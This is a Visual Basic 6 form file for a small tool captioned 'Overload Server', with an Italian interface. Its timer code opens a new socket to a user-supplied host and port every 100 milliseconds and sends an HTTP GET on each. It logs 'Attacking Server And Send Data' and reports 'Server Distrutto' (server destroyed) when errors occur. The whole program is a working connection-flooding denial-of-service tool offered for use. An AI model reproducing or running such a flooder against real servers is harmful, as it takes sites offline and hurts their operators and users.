VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form2 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Overload Server"
   ClientHeight    =   3090
   ClientLeft      =   6825
   ClientTop       =   2595
   ClientWidth     =   4545
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3090
   ScaleWidth      =   4545
   ShowInTaskbar   =   0   'False
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   1800
      TabIndex        =   10
      Text            =   "80"
      Top             =   2160
      Width           =   1095
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Svuota"
      Height          =   255
      Left            =   5520
      TabIndex        =   9
      Top             =   2640
      Width           =   2055
   End
   Begin VB.TextBox Text2 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   1815
      Left            =   4680
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   6
      Top             =   240
      Width           =   4035
   End
   Begin VB.CheckBox Check1 
      Caption         =   "Data Arrival"
      Height          =   255
      Left            =   3000
      TabIndex        =   5
      Top             =   2640
      Width           =   1455
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   1815
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   4
      Top             =   240
      Width           =   4335
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   3720
      Top             =   2640
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Index           =   0
      Left            =   2760
      Top             =   2640
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Stop"
      Height          =   255
      Left            =   3000
      TabIndex        =   1
      Top             =   2160
      Width           =   1335
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Start"
      Height          =   255
      Left            =   240
      TabIndex        =   0
      Top             =   2160
      Width           =   1455
   End
   Begin VB.Label Label4 
      AutoSize        =   -1  'True
      Caption         =   "0"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   300
      Left            =   6720
      TabIndex        =   8
      Top             =   2160
      Width           =   165
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      Caption         =   "Byte"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   360
      Left            =   5520
      TabIndex        =   7
      Top             =   2160
      Width           =   615
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      Caption         =   "0"
      Height          =   195
      Left            =   1560
      TabIndex        =   3
      Top             =   2640
      Width           =   90
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      Caption         =   "Connessioni:"
      Height          =   195
      Left            =   360
      TabIndex        =   2
      Top             =   2640
      Width           =   900
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim Socket As Integer
Private Sub Check1_Click()
If Check1.Value = 1 Then
Me.Width = 8940
Else
Me.Width = 4635
End If

End Sub

Private Sub Command1_Click()
Timer1.Enabled = True
End Sub

Private Sub Command2_Click()
Timer1.Enabled = False

End Sub

Private Sub Command3_Click()
Text2.Text = ""

End Sub

Private Sub Timer1_Timer()
On Error Resume Next

Socket = Socket + 1
Load Winsock1(Socket)
Winsock1(Socket).Connect Form1.Text1.Text, Text3.Text
Do Until Winsock1(Socket).State = sckConnected
DoEvents
Loop
Winsock1(Socket).SendData "GET / HTTP/1.1" & vbCrLf & "Host: " & Form1.Text1 & vbCrLf & vbCrLf
DoEvents

Text1.Text = Text1.Text + "Attacking Server And Send Data" + vbCrLf
Label2.Caption = Socket


End Sub

Private Sub Winsock1_DataArrival(Index As Integer, ByVal bytesTotal As Long)
On Error Resume Next
Dim data As String
Winsock1(Index).GetData data
Text2.Text = Text2.Text + data & vbCrLf
Label4.Caption = bytesTotal

End Sub

Private Sub Winsock1_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Text1.Text = Text1.Text + "Server Distrutto" & vbCrLf

End Sub
